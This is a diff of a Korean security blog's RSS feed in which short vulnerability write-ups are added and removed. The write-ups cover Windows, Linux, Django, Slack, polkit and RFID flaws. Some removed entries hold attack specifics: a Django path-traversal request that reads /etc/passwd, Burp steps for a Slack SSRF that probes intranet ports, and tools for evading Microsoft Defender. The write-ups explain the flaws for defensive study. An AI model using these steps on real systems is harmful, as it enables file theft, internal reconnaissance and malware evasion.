+      <category domain="https://hackyboiz.github.io/tags/pointer-authentication/">pointer authentication</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-31970: Windows Filtering Platform EoP</title>
+      <link>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</link>
+      <guid>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</guid>
+      <pubDate>Sat, 26 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2175">Windows Filtering Platform Token Access Check EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Filtering Platform(WFP)의 TCP/IP 드라이버는 token impersonation level에 대한 검증 미흡으로 발생하는 방화벽 정책 우회 및 권한상승 취약점이 패치되었습니다. </p><p>WFP는 네트워크 필터링을 생성하기 위한 API 및 시스템 서비스들입니다. 소캣에 작업이 들어오면 기본 필터링 엔진 및 Windows 방화벽에서 구성한 정책에 따라 작업이 허용되는지 확인하는데 그 필터링 정책은 호출자의 토큰 상태에 따라 달라집니다. 하지만 이 정책들을 다음과 같은 문제로 인해 우회할 수 있습니다.</p><ul><li><p>PsReferenceImpersonationToken을 호출해 토큰을 TOKEN_ACCESS_INFORMATION 구조체로 변환할 때 impersonation level이 SecurityImpersonation 이상인지 확인하지 않습니다.</p></li><li><p>TCP/IP 드라이버는 토큰 impersonating 도중에 소캣 생성을 허용합니다.</p></li></ul><p>일반 사용자가 시스템 토큰을 캡처하고 impersonat 할 수 있게 되므로 해커는 이를 악용해 방화벽 정책에 의해 명시적으로 허용되지 않는 작업을 수행할 수 있게 됩니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/tcpip/">tcpip</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/wfp/">wfp</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-33739: Microsoft DWM core library의 권한 상승 취약점</title>
+      <link>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</link>
+      <guid>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</guid>
+      <pubDate>Fri, 25 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg&quot;&gt;https:</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg">https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 21H1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://ko.wikipedia.org/wiki/%EB%8D%B0%EC%8A%A4%ED%81%AC%ED%86%B1_%EC%B0%BD_%EA%B4%80%EB%A6%AC%EC%9E%90">Windows 데스크톱 창 관리자</a>(Desktop Window Manager, dwm.exe)의 <code>dwmcore.dll</code> 모듈에서 UAF로 인한 권한 상승 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p><code>dwmcore.dll</code> 모듈의 <code>CinteractionTrackerBindingManager</code> 객체는 참조 횟수(reference count)를 기준으로 해제 시점이 결정됩니다. 객체를 바인딩하는 경우<code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수를 사용하고 참조 횟수가 1 증가하며, 바인딩 해제하는 경우 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수를 사용하며 참조 횟수가 1 감소합니다. 참조 횟수가 0이 된 객체는 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p><p>취약점은 같은 객체를 바인딩하는 리소스가 <code>CinteractionTrackerBindingManager</code> 객체를 참조했을 때 발생하며 해커가 DirectComposition API를 사용해 코드 수준에서 트리거가 가능합니다.</p><ol><li><p>동일한 <code>CinteractionTrackerMarshaler</code>를 바인딩하는 두 개의 리소스가 <code>CinteractionTrackerBindingManager</code>을 참조합니다.</p></li><li><p><code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수는 동일한 <code>CinteractionTrackerMarshaler</code>에 대해 한 번만 호출되어 참조 횟수는 1 증가합니다.</p></li><li><p>리소스의 사용이 종료되고 해제될 때 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수는 각각의 리소스에 대해 두 번 호출됩니다.</p><ul><li><p>첫 호출 시 <code>CinteractionTrackerBindingManager</code> 객체의 참조 횟수가 1 감소합니다. 0이 된 경우 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p></li><li><p>두 번째 호출 시 해제된 <code>CinteractionTrackerBindingManager</code> 객체에 접근하게 되어 UAF가 트리거 됩니다.</p></li></ul></li></ol><p>공개된 PoC는 <a href="https://github.com/mavillon1/CVE-2021-33739-POC">https://github.com/mavillon1/CVE-2021-33739-POC</a> 에서 확인할 수 있으며  <code>dwmcore.dll</code> 에서는 지난 4월 <a href="https://hackyboiz.github.io/2021/04/15/idioth/2021-04-15/">out of bounds write 취약점(CVE-2021-28310)</a>이 공개되기도 했습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[하루한줄] CVE-2021-30522: Google Chrome WebAudio Code Execution Vulnerability</title>
@@ -59,19 +235,19 @@
       
       
       
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a">CVE-2021–20226 a reference counting bug which leads to local privilege escalation in io_uring.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>io_uring in Linux kernel</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 비동기 I/O 메커니즘인 io_uring에서 발생하는 Use-after-free 취약점에 대한 새로운 write-up이 공개되었습니다. File structure를 worker 스레드가 사용할 메모리로 옮기는 과정에서 reference 카운터를 늘리지 않고 file descriptor table을 공유하면 취약점이 발생합니다. </p><p>Worker 스레드는 file_struct 구조체에 대한 reference를 찾기 위해 함수 <code>fdget()</code>를 사용합니다. 하지만 <code>fdget()</code>는 file_struct에 대한 reference counter가 1일 때 이를 증가시키지 않으므로 <code>fdget()</code>에 의해 얻은 파일은 이미 닫히고 해제되어 있을 수도 있습니다.</p><p>이미 닫히고 해제된 파일에 접근해 작업한다는 것은 Use-after-free 취약점으로 해커는 이를 악용해 로컬 시스템에 서비스 거부 공격을 할 수 있습니다.</p>]]></content:encoded>
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a">CVE-2021–20226 a reference counting bug which leads to local privilege escalation in io_uring.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>io_uring in Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 비동기 I/O 메커니즘인 io_uring에서 발생하는 Use-after-free 취약점에 대한 새로운 write-up이 공개되었습니다. File structure를 worker 스레드가 사용할 메모리로 옮기는 과정에서 reference 카운터를 늘리지 않고 file descriptor table을 공유하면 취약점이 발생합니다. </p><p>Worker 스레드는 file_struct 구조체에 대한 reference를 찾기 위해 함수 <code>fdget()</code>를 사용합니다. 하지만 <code>fdget()</code>는 file_struct에 대한 reference counter가 1일 때 이를 증가시키지 않으므로 <code>fdget()</code>에 의해 얻은 파일은 이미 닫히고 해제되어 있을 수도 있습니다.</p><p>이미 닫히고 해제된 파일에 접근해 작업한다는 것은 Use-after-free 취약점으로 해커는 이를 악용해 로컬 시스템에 서비스 거부 공격을 할 수 있습니다.</p>]]></content:encoded>
       
       
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
       
       <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
       
       <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       
       <comments>https://hackyboiz.github.io/2021/06/23/fabu1ous/2021-06-23/#disqus_thread</comments>
@@ -99,9 +275,9 @@
       
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
       <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
       
       <category domain="https://hackyboiz.github.io/tags/msi/">msi</category>
       
@@ -242,13 +418,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
       <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
       
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
       
@@ -438,9 +614,9 @@
       
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
-      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
-      
       <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
       
       <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
       
@@ -509,190 +685,16 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
-      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
       
       <category domain="https://hackyboiz.github.io/tags/webkit/">webkit</category>
       
       
       <comments>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-33203: Django path traversal vulnerability</title>
-      <link>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/</link>
-      <guid>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/</guid>
-      <pubDate>Fri, 11 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-075-d</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬에서 작성된 오픈소스 웹 프레임워크 Django에서 path traversal 취약점이 발견되었습니다. 해당 취약점은 <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join 합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code>와 같은 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/django/">django</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/python/">python</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] 헤더 수정을 통한 Slack infra metadata 유출</title>
-      <link>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/</link>
-      <guid>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/</guid>
-      <pubDate>Thu, 10 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/727330&quot;&gt;Header modification</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/727330">Header modification results in disclosure of Slack infra metadata to unauthorized parties</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Slack</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>클라우드 기반 팀 협업 도구 Slack의 <em>files.slack.com</em> 도메인에서 호스트 헤더 대신 <code>X-Forwarded-Host</code> 헤더를 사용하여 infra metadata를 유출할 수 있는 취약점이 발견되었습니다.</p><p>호스트가 <em>files.slack.com</em>이 아닐 때, 해당 URL은 500 Internal server error를 반환하는 유효성 검사가 존재합니다. 하지만 호스트 이름의 끝 부분에 ‘@’를 추가하여 해당 검사를 우회할 수 있습니다. 또한 해당 request는 프론트 엔드가 아닌 백 엔드로 전달되어 Blind SSRF 취약점이 존재하면 인트라넷에 arbitrary request를 전송하여 응답 시간을 통해 다양한 정보를 확인할 수 있습니다.</p><p>이를 통해 인트라넷에 열려있는 포트를 확인하는 과정은 다음과 같습니다.</p><ol><li><p>슬랙에 파일을 업로드하고 “Open original”을 통해 원본 이미지 경로를 찾아 burp suite로 가져옵니다.</p></li><li><p>repeater로 전송하고 클릭하여 정상적으로 접근되는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: xxx.com</code>을 헤더에 추가하여 500 error가 발생하는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: file.slack.com@YOUR_DOMAIN</code>으로 헤더를 수정하고 302 response가 오는지 확인합니다. 경로는 <code>YOUR_DOMAIN/files-pri/...</code>로 지정합니다.</p></li><li><p>도메인에 request가 전송되었는지 확인하고 도메인을 인트라넷 IP로 변경합니다. 포트를 바꿔가며 응답 시간을 확인합니다.</p></li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/slack/">slack</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/ssrf/">ssrf</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-33881: RFID tear off attack, bypass monotonic counter</title>
-      <link>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/</link>
-      <guid>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/</guid>
-      <pubDate>Wed, 09 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.quarkslab.com/rfid-monotonic-counter-anti-te</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html#eeprom-tear2">RFID: Monotoic Counter Anti-Tearing Defeated</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MIFARE Ultralight EV1, MF0UL</p><p>MIFARE Ultralight C, MF0ICU</p><p>MIFARE Ultralight NANO, MF0UN</p><p>NT2L1, NT2H10, NT2H12</p><p>N2H13, NT2H15, NT2H16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NXP MIFARE Ultralight와 NTAG 카드는 replay 공격을 방지하기 위한 Monotonic Counter 기능을 사용하는데 해당 기능을 tear off 공격을 통해 무력화할 수 있는 취약점이 발견되었습니다. Tear off 공격이란 RFID 태그와 리더 사이 데이터 통신이 이루어지는 도중에 통신을 끊어버리는 공격 방식으로 EEPROM이 쓰기 작업을 하는 동안 RFID 태그의 데이터가 일관되지 않은 상태로 유지되어 버그가 발생하도록 유도합니다.</p><p>MIFARE Ultralight EV1은 24-bit Monotonic Counter를 사용하고 이와 관련된 커멘드를 사용합니다.</p><ol><li><code>INCR_CNT</code> : Counter를 증가시킨다.</li><li><code>READ_CNT</code> : 현태 Counter의 값을 읽는다.</li><li><code>CHECK_TEARING_EVENT</code> : anti-tearing 8-bit flag를 검증한다.</li></ol><p><code>INCR_CNT</code>를 통해 유효한 Counter의 값을 증가 시킴과 동시에 tear off 공격을 수행하면 Counter에 대한 쓰기 작업에 인터럽트를 걸 수 있고, <code>READ_CNT</code>가 이전 Counter의 값을 리턴하면서 <code>CHECK_TEARING_EVENT</code>가 정상적인 검증 flag를 리턴하는 상황을 만들 수 있습니다. </p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/rfid/">rfid</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/monotonic-counter/">monotonic counter</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/tear-off/">tear off</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-3560: Ubuntu/Fedora 인증 관리 프로그램 polkit의 로컬 권한 상승 취약점</title>
-      <link>https://hackyboiz.github.io/2021/06/08/l0ch/2021-06-08/</link>
-      <guid>https://hackyboiz.github.io/2021/06/08/l0ch/2021-06-08/</guid>
-      <pubDate>Tue, 08 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://seclists.org/oss-sec/2021/q2/180&quot;&gt;CVE-2021-3560 p</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/180">CVE-2021-3560 polkit: local privilege escalation using polkit_system_bus_name_get_creds_sync()</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>polkit 0.113 ~ 0.118</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>polkit은 Unix 계열 OS(Ubuntu, Fedora 등의 리눅스 배포판)에서 시스템 전반의 인증을 통제하는 프로그램으로, sudo 등 기존 인증 시스템과 달리 느슨한 수준의 인증을 수행해 권한이 없는 프로세스가 권한 있는 계정과 커뮤니케이션을 할 수 있습니다.</p><p><img src="/2021/06/08/l0ch/2021-06-08/1.png"></p><blockquote><p>출처 : <a href="https://ko.wikipedia.org/wiki/%ED%8F%B4%ED%82%B7">위키백과</a></p></blockquote><p>polkit은  <code>polkit_system_bus_name_get_creds_sync()</code> 함수를 사용해 권한이 필요한 작업을 요청하는 프로세스의 uid 및 pid를 가져옵니다. 해당 함수는 요청 프로세스의 고유한 bus name을 <a href="https://ko.wikipedia.org/wiki/D-Bus">D-bus</a>의 <code>dbus-daemon</code>에 전송해 요청 프로세스의 권한을 확인하는데, 권한 상승 취약점은 함수 호출 직전에 요청 프로세스와 <code>dbus-daemon</code>의 연결이 끊어질 때 발생합니다. <code>dbus-daemon</code>은 연결이 끊어진 프로세스의 bus name이 유효하지 않으므로 error 응답을 보내지만 <code>polkit_system_bus_name_get_creds_sync()</code> 함수에서 이를 확인하지 않아 성공적으로 프로세스의 정보를 가져왔다는 의미의 TRUE를 반환합니다. 해당 함수의 호출자 일부는 추가적인 검증 없이 0으로 초기화된 <code>AsyncGetBusNameCredsData</code> 구조체를 참조하게 되어 요청 프로세스의 uid를 0으로 생각하고 root 프로세스가 요청한 것으로 작업을 수행합니다.</p><p>취약점의 패치 정보는 <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a">https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a</a>  에서 확인할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/ubuntu/">ubuntu</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/fedora/">fedora</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/08/l0ch/2021-06-08/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] 간단한 Defender 우회 방법</title>
-      <link>https://hackyboiz.github.io/2021/06/07/idioth/2021-06-07/</link>
-      <guid>https://hackyboiz.github.io/2021/06/07/idioth/2021-06-07/</guid>
-      <pubDate>Mon, 07 Jun 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defend</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/">How to bypass Defender in a few easy steps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안티 바이러스는 기본적으로 signature detection, heuristics detection, in memory detection을 통해 악성코드를 탐지합니다.</p><p>signature의 경우 이미 알려진 악성코드의 파일 전체의 해쉬 값이나 악성 행위를 하는 부분의 일부 해쉬 값과 비교하여 악성코드를 탐지합니다. heuristics는 signature 탐지 다음 단계에서 진행되는 것으로 악성코드를 에뮬레이팅하여 어셈블리나 코드를 살펴보고 어떠한 행위를 하는지 확인하여 악성코드를 탐지합니다. 하지만, 디스크에 파일이 없는 fileless 악성코드(powershell, vba macro, reflection for c# assembly)의 경우 Microsoft Defender는 <a href="https://docs.microsoft.com/ko-kr/windows/win32/amsi/antimalware-scan-interface-portal">AMSI</a> 스캔을 통해 악성코드를 탐지합니다.</p><p>signature detection을 우회하기 위해서는 어떠한 부분을 안티 바이러스가 악성코드로 판단했는지 알아내야 합니다. AntiScan.me, VirusTotal에서 <code>DefenderCheck</code>, <code>Find-AVSignature</code> 등을 활용하여 판단하는 부분을 찾아낸 후 해당 문자열을 리팩터링하거나 어셈블리를 수정할 수 있지만 각 안티 바이러스마다 수행하거나 파일이 손상될 가능성이 존재합니다. 따라서 <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> 같은 도구를 통해 코드를 난독화하여 signature detection을 우회할 수 있습니다.</p><p>C#으로 작성된 악성코드의 경우 <a href="https://github.com/Flangvik/NetLoader">NetLoader</a>를 사용하여 heuristics detection과 in memory detection을 우회할 수 있습니다. NetLoader는 C# 어셈블리를 경로, URL이나 SM 공유에서 reflection을 통해 로드합니다. 디스크에 악성 파일이 존재하지 않아 heuristics detection을 우회할 수 있고 Microsoft에서 NetLoader에 signature를 추가하지 않아 in memory detection 또한 우회할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/signature/">signature</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/heuristic/">heuristic</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/antivirus/">antivirus</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/06/07/idioth/2021-06-07/#disqus_thread</comments>
       
     </item>
     
